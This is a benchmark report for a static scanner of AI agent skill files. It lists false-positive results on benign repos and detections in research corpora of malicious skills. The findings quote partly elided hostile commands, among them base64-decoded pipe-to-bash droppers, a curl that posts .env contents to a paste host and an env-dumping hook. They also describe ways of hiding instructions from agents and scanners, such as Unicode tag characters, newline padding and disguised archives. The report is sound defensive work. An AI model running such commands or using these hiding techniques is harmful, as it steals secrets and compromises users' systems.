# Sigil scan benchmark

Real results from running `sigil scan` against public research corpora. The goal is **no high or
critical false positive** on well-known benign skill repos, while still catching the published
malicious samples. Numbers are reproducible with `node packages/sigil/scripts/scan-bench.mjs`, which
reads the corpora from a scratch dir **outside** the repo and never executes their contents.

- **Date:** 2026-11-01
- **Tool:** `sigil-scan@0.0.0` (this branch)
- **Method:** each repo shallow-cloned at the SHA below into
  `/private/tmp/claude-501/sigil-scan-bench/`, scanned statically, every high/critical reviewed by hand.

## Corpora and commits

| Repo | Role | Commit | Cloned |
| --- | --- | --- | --- |
| [anthropics/skills](https://github.com/anthropics/skills) | precision (benign) | `ca45fc496a3436251f191354091d557da31c15b5` | 2026-11-01 |
| [obra/superpowers](https://github.com/obra/superpowers) | precision (benign) | `2ce8aa15d05bd57213e6f746f953aafb7ded7a8b` | 2026-11-01 |
| [vercel-labs/agent-skills](https://github.com/vercel-labs/agent-skills) | precision (benign) | `1a2c79d4e6c4a2283dc2c614b6538cbe1ed5ca62` | 2026-11-01 |
| [snyk-labs/toxicskills-goof](https://github.com/snyk-labs/toxicskills-goof) | recall (malicious) | `80ce2e06f52fd384163c4bd6778676019723773c` | 2026-11-01 |
| [trailofbits/overtly-malicious-skills](https://github.com/trailofbits/overtly-malicious-skills) | recall (malicious) | `4ffbf9461ef0505f9ce76a0d3694a18ec33ea531` | 2026-11-01 |

`vercel-labs/agent-skills` is the repo that exists; the brief's alternate `vercel-labs/skills` was not needed.

## Precision: benign repos (findings by severity)

| Repo | skills | critical | high | medium | low |
| --- | --- | --- | --- | --- | --- |
| anthropics/skills | 21 | **0** | **0** | 24 | 6 |
| obra/superpowers | 16 | **0** | **0** | 5 | 0 |
| vercel-labs/agent-skills | 10 | **0** | **0** | 3 | 1 |

**Zero high or critical false positives across all three repos** — the target is met. Every medium/low is
a review item at warn level, not a block. The medium/low findings, reviewed by hand:

- **SIG-SEC-042** (10, anthropics): `printenv`/`os.environ` in the `claude-api` eval scaffolding and migration
  probes, which deliberately reference environment and honeytoken paths as *test data*. Kept at medium (no
  network sender), correctly not high.
- **SIG-SEC-040** (4, anthropics): `~/.ssh/id_rsa` named inside the eval runner's honeytoken comments and docs.
- **SIG-SEC-006 / 060 / 061 / 050 / 070 / 030 / 001** (anthropics): single occurrences, each a doc or example
  (a password-protected-archive mention, cron in a reference, an rc-file example, a POST in an eval sample),
  downgraded out of the high band by the context model.
- **SIG-SEC-007** (npx without a pinned version), **SIG-SEC-083** (build `prepare` scripts): routine hygiene.
- **SIG-SEC-072** (obra): `git push --force` / history commands in the git-worktrees and finishing-a-branch
  skills — real but intended, reported at medium.
- **SIG-SEC-031 / 004 / 042** (vercel): editing a project `CLAUDE.md` (downgraded to medium because it is the
  project's own instruction file), an unpinned install, and token discovery via `printenv | grep`.

Earlier iterations produced high false positives that tuning removed, each a boundary bug now covered by a
negative test: `--no-prompt` read as `--sandbox` disable; `--format json 2>/dev/null` read as disk `format`;
`--url-host $X` read as a `host` DNS lookup; `.env | cut` read as an `env` dump; `-o ./dist/x` read as
executing a downloaded file; `http`/`data=` in ordinary API-call docs read as exfiltration.

## Recall: malicious repos

| Repo | units | flagged (warn+fail) | failing (high+) | critical | high | medium | low |
| --- | --- | --- | --- | --- | --- | --- | --- |
| snyk-labs/toxicskills-goof | 10 | 10 | 8 | 9 | 14 | 7 | 31 |
| trailofbits/overtly-malicious-skills | 4 | 4 | 3 | 0 | 5 | 2 | 0 |

**Every malicious skill is flagged.** Notable true positives:

- **toxicskills `clawhub`**: the `echo … | base64 -d | bash` prerequisite dropper → SIG-SEC-001 (pipe-to-shell),
  SIG-SEC-010 (decode-and-execute), SIG-SEC-011 (the base64 blob decodes to a `curl … | bash`), SIG-SEC-006
  (password-protected archive). All critical/high.
- **toxicskills `vercel`**: `curl --data "…$(uname -a)…$(cat .env)…" paste.c-net.org` → SIG-SEC-050 critical
  (captured data to a paste host), plus SIG-SEC-005 (remote instructions).
- **toxicskills `google`**: the rentry.co second-stage lure and password archive → SIG-SEC-005, SIG-SEC-006.
- **toxicskills `testing-guidelines`**: a "Prerequisites" payload hidden in Unicode tag characters →
  SIG-SEC-020 critical (decoded and shown).
- **toxicskills `snyk-skill`**: `curl … | bash` in an HTML comment and a UserPromptSubmit `env > /tmp/a` hook.
- **ToB `csv-summarizer`**: the 100,000-newline padding → SIG-SEC-033 high.
- **ToB `simple-formatter`**: `.pyc` bytecode payload with clean source → SIG-SEC-080 high.
- **ToB `context-loader`**: the `.docx.txt` that is really a ZIP carrying `sync1.sh` → SIG-SEC-080 (disguised)
  high + SIG-SEC-081 (script member) — the exact Trail of Bits document-indirection bypass.
- **ToB `dev-env-setup`**: `.npmrc`/`.yarnrc` redirected to a non-default registry → SIG-SEC-009 medium.

### Expected non-findings / caveats

- Two toxicskills units are correctly **not** failed: `demos/skill-with-commands` (a benign `git diff`/`git
  status` sample) and the repo's own `marketplace.json`/`package.json` config.
- `skill-defender` (a fake "scanner" skill) trips SIG-SEC-010/040 on its own embedded detection patterns. A
  real scanner skill would too; this is the known "a scanner contains the strings it hunts for" caveat
  (see SIG-SEC rules' mention/negation handling, which cannot distinguish a genuine detector from a lure).
- The malicious low-severity counts are mostly context-downgraded secondary matches on the same lines.

## What this benchmark does not prove

Passing is not safety. Natural-language intent in novel wording, environment-gated payloads and runtime
reconstruction defeat any static scanner (Snyk ToxicSkills; Trail of Bits; Tencent Zhuque Lab; CSA
SkillCloak). Those are the job of the lab's behavioural canary sandbox and human review. See `RULES.md`
"Known gaps".
